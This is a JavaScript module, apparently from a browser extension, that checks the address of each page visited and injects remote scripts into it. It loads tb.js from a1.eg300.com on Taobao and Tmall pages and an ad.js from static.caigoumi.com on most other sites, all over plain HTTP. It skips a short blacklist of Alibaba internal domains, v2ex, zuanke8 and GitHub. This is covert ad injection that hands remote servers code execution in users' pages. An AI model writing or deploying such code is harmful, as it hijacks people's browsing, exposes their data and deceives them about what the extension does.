(function() {
	"use strict";
	//if exist return, else construct
	if(!window.comeg300a1) {
		window.comeg300a1 = {};
	}
	if(!window.comeg300a1.extension) {
		window.comeg300a1.extension = {};
	}
	if("undefined" !== typeof window.comeg300a1.extension.loopdomain) {
		return ;
	}

	var that = {
		baseUrl: "http://a1.eg300.com",
		rules: {
			tb: /^http(s)?:\/\/(.*)\.(taobao|tmall)\.com/i,
			blacklist: /^http(s)?:\/\/(.*)\.(aliway|alimama|alibaba-inc|v2ex|zuanke8|github)\.com/i,
			other: /^http(s)?:\/\/.*/i
		},
		utils: {
			A: function(a, b) {
				if (typeof b == "string") {
					a.innerHTML = b;
				} else {
					a.appendChild(b);
				}
				return b;
			},
			C: function(name) {
				return document.createElement(name);
			},
			T: function(name, no) {
				return document.getElementsByTagName(name)[no];
			},
			D: function(id) {
				var obj = document.getElementById(id);
				obj.parentNode.removeChild(obj);
			},
			addScript: function(content, inline, callback, async) {
				var head = that.utils.T("head", 0);
				var script = that.utils.C("script");
				script.type = "text/javascript";
				script.charset = "utf-8";
				if (inline) {
					script.text = content;
				} else {
					if (async) {
						script.setAttribute("defer", "");
						script.setAttribute("async", "true");
					}
					script.onload = script.onreadystatechange = function() {
						if (script.readyState && script.readyState != "loaded" && script.readyState != "complete") {
							return;
						} else {
							if (callback) {
								callback();
							}
							script.onload = script.onreadystatechange = null;
						}
					}
					script.src = content;
				}
				that.utils.A(head, script);
				if (inline && callback) {
					callback();
				}
			},
			getSuffix: function() {
				var d = new Date();
				var suffix = '?t=' + d.getFullYear() + (d.getMonth() + 1) + d.getDate();
				return suffix;
			},
			getScriptPath: function(path, params) {
				var url = that.baseUrl + path + that.utils.getSuffix();
				if(params) {
					for(var key in params) {
						url += "&" + key + "=" + params[key];
					}
				}
				return url;
			},
			parseURL: function(url){
				var a = document.createElement("a");
				a.href = url;
				return {
					source: url,
					protocol: a.protocol.replace(":", ""),
					host: a.hostname,
					port: a.port,
					query: a.search,
					params: (function(){
						var ret = {}, seg = a.search.replace(/^\?/, "").split("&"), len = seg.length, i = 0, s;
						for (; i < len; i++) {
							if (!seg[i]) {
								continue;
							}
							s = seg[i].split("=");
							ret[s[0]] = s[1];
						}
						return ret;
					})(),
					file: (a.pathname.match(/\/([^\/?#]+)$/i) || [, ""])[1],
					hash: a.hash.replace("#", ""),
					path: a.pathname.replace(/^([^\/])/, "/$1"),
					relative: (a.href.match(/tps?:\/\/[^\/]+(.+)/) || [, ""])[1],
					segments: a.pathname.replace(/^\//, "").split("/")
				};
			}
		},
		urlMatch: function(url) {
			for (var module in that.rules) {
				var pattern = that.rules[module];
				//console.log(url.match(pattern));
				//console.log(matches);
				if (pattern.test(url)) {
					var rt = {
						module: module
					};
					return rt;
				}
			}
			return false;
		},
		init: function(url) {
			var params = that.utils.parseURL(url);
			url = params.protocol + "://" + params.host;
			var rt = that.urlMatch(url);
			var module = rt.module;
			//console.log(rt, module);
			var script = false;
			switch(module) {
				case 'tb':
					script = that.utils.getScriptPath("/js/extension/tb.js");
					break;
				case 'blacklist':
					break;
				case 'other':
				defalut:
					script = "http://static.caigoumi.com/js/extension/ad.js" + that.utils.getSuffix();
					break;
			}
			if(script) {
				that.utils.addScript(script, false, false, true);
			}
		}
	}
	that.init(window.location.href);

	window.comeg300a1.extension.loopdomain = that;
})();
